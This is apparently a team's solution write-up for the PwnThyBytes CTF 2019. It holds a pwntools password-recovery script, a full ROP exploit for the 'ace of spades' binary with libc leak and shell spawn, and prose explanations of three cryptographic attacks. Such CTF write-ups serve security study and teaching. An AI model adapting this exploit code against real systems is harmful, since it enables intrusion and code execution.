# PwnThyBytes CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190928-pwnthybytesctf/) of this writeup.**


 - [PwnThyBytes CTF 2019](#pwnthybytes-ctf-2019)
   - [Warmup/Learning](#warmuplearning)
     - [pass_the_hash](#pass_the_hash)
   - [Memory Corruption](#memory-corruption)
     - [ace of spades](#ace-of-spades)
   - [Crypto](#crypto)
     - [Wrong ring](#wrong-ring)
     - [Avec](#avec)
     - [LOTR](#lotr)


## Warmup/Learning

### pass_the_hash

```python=
from pwn import *
from hashlib import *
import hashlib

host, port = '52.142.217.130', 13374

p_head_ans, p_tail_ans = '', ''
p_head_l, p_tail_l = [], []

def send(r):
    global p_head_ans, p_tail_ans, p_head_l, p_tail_l
    salt_1 = os.urandom(11) + '\x00'
    salt_2 = '\x00' + os.urandom(11)
    salt = salt_1 + salt_2
    r.sendline(salt.encode('hex'))

    h = r.recvline()[:-1].decode('hex')
    l_pass, r_pass = h[:32], h[32:]
    p_head = xor(xor(l_pass[-12:], salt_1), l_pass[:12])
    p_tail = xor(xor(r_pass[:12], salt_2), r_pass[-12:])

    if not p_head_ans:
        if p_head in p_head_l:
            print('found p_head')
            print(p_head)
            p_head_ans = p_head
        else:
            p_head_l.append(p_head)

    if not p_tail_ans:
        if p_tail in p_tail_l:
            print('found p_tail')
            print(p_tail)
            p_tail_ans = p_tail
        else:
            p_tail_l.append(p_tail)

def main():
    r = remote(host, port)
    r.recvline()

    for i in range(1024):
        if p_head_ans and p_tail_ans:
            break
        print(i)
        send(r)

    r.sendline('')
    r.recvline()
    salt = r.recvline()[:-1].decode('hex')
    password = p_head_ans + p_tail_ans[-8:]

    no_rounds = 16
    h_list = [sha, sha1, ripemd160, sha256]
    ans = combo_hash(salt, password, h_list, no_rounds).encode('hex')
    r.sendline(ans)
    r.interactive()

main()
# PTBCTF{420199e572e685af8e1782fde58fd0e9}
```

## Memory Corruption

### ace of spades

x86 32bit efl, strcpy has vulnerabilty when the src and dest are overlaping.
duplicating ace of spades, make play point be 16000.

Then, overwrite the rbp and ret addr, ROP attack.

```python=
from pwn import *
import sys


if len(sys.argv) > 1:
    r = remote('137.117.216.128', 13375)
else:
    r = process('./ace_of_spades')

def draw():
    r.sendlineafter(':', '1')

def discard():
    r.sendlineafter(':', '2')

def play():
    r.sendlineafter(':', '3')

def show():
    r.sendlineafter(':', '4')

def fold():
    r.sendlineafter(':', '5')

#for i in range(29):
#	draw()

target1 = 0x81839ff0
target2 = 0xa1829ff0 
target3 = 0xbe829ff0

def get_leak():
	show()
	r.recvuntil('hand is:\n')
	r.recvn(5*22)
        val = u32(r.recvn(5)[1:]) 
	if val == target1 or val == target2 or val == target3:
	    return 0
	return u32(r.recvn(4)) 

def duplicate(target):
    while True:
	for i in range(24):
	    draw()
	if target == get_leak():
            for i in range(5):
                draw()
            discard()
            return
        else:
            fold()

for i in range(10):
   print('magic', i)
   duplicate(0xa1829ff0)
   fold()

"""
for i in range(10):
   print('t1', i)
   duplicate(0x81839ff0)
   fold()

for i in range(10):
   print('t3', i)
   duplicate(target3)
   fold()
"""

print("done")


#r.interactive()
while True:
    for i in range(5):
        draw()

    play()
    r.recvuntil('points: ')
    point = int(r.recvline()[:-1])
    print('hello', point)
    if point >= 16000 and point < 17000:
        r.recvuntil('prize: ')
	stack = u32(r.recvn(4))-0x10
	code = u32(r.recvn(4))-0x1355
	print hex(stack)
	print hex(code)

	payload = flat(
	0x1234,
	code+0x638,0x1234,0,stack,0x100
	)

	r.sendlineafter(":","2")
	r.send(payload.ljust(0x20,"\x00"))

	r.sendlineafter(": ","6")

	payload = flat(
	code+0x0619,code+0x2f98,code+0x668,code+0x0619,code+0x02fb0,
	code+0x0619,code+0x2f98,code+0x638,0x1234,0,stack+0x18,0x100
	)

	r.send(payload.ljust(0x30,"\x00").ljust(0x100,"\x00"))
	libc = u32(r.recvn(4))-0x49670
	print hex(libc)
	r.send(p32(libc+0x3ac62).ljust(0x100,"\x00"))

	r.interactive()

    elif point >= 1000:
        r.sendlineafter('Choose: ', '1')     
    
    fold()

r.interactive()

```

## Crypto
### Wrong ring
Those coefficients of high degree error terms are very small(less than 0.5).
So just take those high degree terms from each result and solve some linear equations to get the flag

### Avec
The keyspace is only 32bits:

```
sage: (2**64 - 1) / 0xbcafffff435
4294967297/3019
```

So it is feasible to bruteforce the key.

However, we also need its nonce to decrypt our flag. To recover nonce, we need to know how GCM works.
In GCM mode, plaintext is encrypted using CTR mode, and then we calculate a hash of all ciphertext & auth data & length.
After that, we generate authentication tag by XOR the hash with first block of CTR keystream.

We can calculate the hash without nonce, so we can recover the first keystream block by xor the hash with final tag.
And the plaintext of first block is nonce.

### LOTR
The signature is 243 ciphertext of RSA, and the way they verify it is decrypting them with a public key, xor together, and check whether they are equal to the hash.
It's is not possible to forge the plaintext without secret key, but we can select which plaintext to xor.
To solve this task, I generate a pair of ciphertext randomly for each RSA key, and solve a GF2 linear equations to decide which one to use.
```
      [plain1_A 1 0 0 ... 0]
      [plain1_B 1 0 0 ... 0]
      [plain2_A 0 1 0 ... 0]
?  X  [plain2_B 0 1 0 ... 0]  =  [result 1 1 1 ... 1]
      ...
      [plainN_A 0 0 0 ... 1]
      [plainN_B 0 0 0 ... 1]
```

If the equation has no solution, just generate another one.
